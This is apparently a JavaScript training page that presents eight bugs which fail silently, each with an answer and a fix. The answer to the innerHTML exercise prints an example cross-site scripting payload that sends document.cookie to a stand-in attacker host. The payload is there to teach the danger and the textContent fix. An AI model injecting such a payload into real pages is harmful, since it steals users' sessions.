The interview questions test whether you know the rules. These eight test
whether you can spot a rule being broken in code that looks fine and runs
without complaint. Not one of them throws. JavaScript's defining habit is that
it keeps going: it converts, it returns `undefined`, it gives you `NaN`, and the
first sign of trouble is a wrong number on a screen somebody trusts.

## Why this matters in a job

Because this is the job. Nobody at work hands you a question about hoisting;
they hand you a ticket that says "the fee total on the accounts page is wrong"
and the code that produces it. Some fresher interviews do the same: "here is a
function, it has a bug, find it". For each one below, write down three things
before opening the answer: what it prints, the rule from the track it breaks,
and the fix.

## 1. The fee total that is a string

```javascript [fee-total.js]
const fees = ["45000", "32000", "45000"];      // read from a form
const total = fees.reduce((sum, fee) => sum + fee, 0);
console.log(total);
```

```text [Output]
0450003200045000
```

::accordion
  :::accordion-item{label="Answer" icon="i-lucide-check"}
  `+` with a string on either side joins instead of adding, and form values are
  always strings. The first step is `0 + "45000"`, which is `"045000"`.

  ```javascript
  const total = fees.reduce((sum, fee) => sum + Number(fee), 0);   // 122000
  ```

  Better still, convert at the **boundary**, where the data enters, so every
  later line works with numbers. And check the conversion: `Number("")` is 0
  and `Number("abc")` is `NaN`, which then poisons the total with no error.
  :::
::

## 2. The mark of zero that disappears

```javascript [who-sat.js]
const marks = { anita: 78, vikram: 0, rahul: null, priya: 75 };
const appeared = Object.keys(marks).filter(name => marks[name]);
console.log(appeared.join(", "));
```

```text [Output]
anita, priya
```

::accordion
  :::accordion-item{label="Answer" icon="i-lucide-check"}
  `0` is falsy, so Vikram, who sat the paper and scored zero, is treated like
  Rahul, who was absent. The filter needs to ask "is there a mark?", not "is
  the mark truthy?".

  ```javascript
  const appeared = Object.keys(marks).filter(name => marks[name] != null);
  // anita, vikram, priya
  ```

  `!= null` is the one place loose equality is idiomatic: it matches both
  `null` and `undefined`.
  :::
::

## 3. The this that is not

```javascript [register.js]
class AttendanceRegister {
  constructor(button) {
    this.present = 0;
    button.addEventListener("click", function () {
      this.present++;
      console.log(this.present);
    });
  }
}
```

Each click logs `NaN`.

::accordion
  :::accordion-item{label="Answer" icon="i-lucide-check"}
  A regular `function` gets its `this` from how it is called. The browser calls
  a listener with `this` set to the **button**, so `this.present` is the
  button's `present`, which is `undefined`, and `undefined + 1` is `NaN`.

  ```javascript
  button.addEventListener("click", () => {
    this.present++;                      // the arrow keeps the register's this
    console.log(this.present);
  });
  ```

  Arrow functions for callbacks, regular methods for methods. That one rule
  prevents almost every `this` bug.
  :::
::

## 4. The loop that prints the same semester

```javascript [semesters.js]
for (var sem = 1; sem <= 3; sem++) {
  setTimeout(() => console.log("Semester " + sem), 0);
}
```

```text [Output]
Semester 4
Semester 4
Semester 4
```

::accordion
  :::accordion-item{label="Answer" icon="i-lucide-check"}
  `var` is function scoped, so there is one `sem` for the whole loop, and all
  three closures share it. The timers run after the loop has finished, when
  `sem` is 4.

  ```javascript
  for (let sem = 1; sem <= 3; sem++) { ... }   // Semester 1, 2, 3
  ```

  The answer that wins in an interview names the mechanism: closures capture
  variables, not values, and `let` gives each pass of the loop its own
  variable.
  :::
::

## 5. The list that is always empty

```javascript [student-list.js]
let students = [];
fetch("/api/students?dept=CSE")
  .then(response => response.json())
  .then(data => { students = data; });

renderTable(students);          // always renders an empty table
```

::accordion
  :::accordion-item{label="Answer" icon="i-lucide-check"}
  `fetch` returns immediately with a promise, so `renderTable` runs before the
  response has arrived, every time, on every machine, including the fast one
  you tested on.

  ```javascript
  async function showStudents() {
    const response = await fetch("/api/students?dept=CSE");
    if (!response.ok) throw new Error(`Server answered ${response.status}`);
    renderTable(await response.json());
  }
  ```

  Two more things the fix adds. `fetch` does not reject on a 404 or 500, so
  `response.ok` must be checked. And a real page shows a loading state first,
  because there is always a gap.
  :::
::

## 6. The double submit

```javascript [enquiry.js]
submitButton.addEventListener("click", async () => {
  await fetch("/api/enquiries", { method: "POST", body });
  showConfirmation();
});
```

On a slow connection an applicant taps twice and two enquiries are created.

::accordion
  :::accordion-item{label="Answer" icon="i-lucide-check"}
  Nothing stops a second click while the first request is in flight.

  ```javascript
  submitButton.addEventListener("click", async () => {
    submitButton.disabled = true;
    try {
      const response = await fetch("/api/enquiries", { method: "POST", body });
      if (!response.ok) throw new Error(await response.text());
      showConfirmation();
    } catch (error) {
      showError(error.message);
    } finally {
      submitButton.disabled = false;
    }
  });
  ```

  `finally` matters: without it, one failure leaves the button disabled for
  good. And say the honest part out loud: this is a courtesy, not a fix. A
  direct request skips the button entirely. The real defence is a unique
  constraint on the server's database, which is where the SQL and DBMS tracks
  come back.
  :::
::

## 7. The list that rebuilds the world

```javascript [render.js]
function render(students) {
  list.innerHTML = "";
  for (const s of students) {
    list.innerHTML += `<li>${s.name} - ${s.dept}</li>`;
  }
}
```

It is called on every keystroke in a search box. Two bugs.

::accordion
  :::accordion-item{label="Answer" icon="i-lucide-check"}
  **Speed.** `innerHTML +=` makes the browser re-read and rebuild the whole
  list on every pass, so 400 students is 400 rebuilds per keystroke.

  **Security, the serious one.** `s.name` goes into the page as markup. A
  student who registers with the name
  `<img src=x onerror="fetch('https://attacker.example/?c='+document.cookie)">`
  runs code in the browser of every faculty member who opens the list. That is
  cross-site scripting.

  ```javascript
  function render(students) {
    list.replaceChildren(...students.map(s => {
      const li = document.createElement("li");
      li.textContent = `${s.name} - ${s.dept}`;   // text: nothing in it can run
      return li;
    }));
  }
  ```

  And since it runs on every keystroke, wrap the search handler in a
  `debounce` from the closures lesson.
  :::
::

## 8. The merit list in the wrong order

```javascript [merit.js]
const scores = [78, 9, 100, 64];
const ranked = scores.sort().reverse();
console.log(ranked.join(", "));
console.log(scores.join(", "));
```

```text [Output]
9, 78, 64, 100
9, 78, 64, 100
```

::accordion
  :::accordion-item{label="Answer" icon="i-lucide-check"}
  Two bugs. `sort()` with no comparator compares as **text**, giving
  `100, 64, 78, 9`, and reversed that is `9, 78, 64, 100`. And `sort` and
  `reverse` change the array in place, so the original `scores` was scrambled
  too.

  ```javascript
  const ranked = [...scores].sort((a, b) => b - a);   // 100, 78, 64, 9
  ```

  Copy first, then sort with a numeric comparator. `b - a` gives descending
  order, so no `reverse` is needed.
  :::
::

## Real use case

Every one of these eight shipped somewhere, in some form, and was found by a
user rather than a test. The habit that catches them before that is the one
this page trains: when a number looks wrong, ask which rule of the language
produced it (coercion, falsy, `this`, scope, timing, mutation) before you
touch the code.

## Interview questions

::accordion
  :::accordion-item{label="How would you debug a value that is NaN on the screen?" icon="i-lucide-message-circle"}
  Work backwards to where it became `NaN`, with `console.log` or a breakpoint
  in the browser's Sources panel. It almost always starts with a string that
  was not a number (`Number("")` is 0 but `Number("45,000")` is `NaN`) or an
  `undefined` property used in maths. Then fix it at the boundary where the
  data entered.
  :::

  :::accordion-item{label="Name three JavaScript bugs that produce no error." icon="i-lucide-message-circle"}
  `"5" + 2` joining instead of adding, `if (mark)` dropping a mark of 0, and
  using the result of `fetch` before it arrives. Also: `sort()` on numbers,
  `var` in a loop with callbacks, and a method passed as a callback losing
  `this`.
  :::

  :::accordion-item{label="Why is disabling the submit button not enough to stop duplicates?" icon="i-lucide-message-circle"}
  Because anyone can send the request without the page: with developer tools,
  `curl` or a script. Browser checks help honest users; the server must enforce
  uniqueness, usually with a unique constraint in the database.
  :::
::
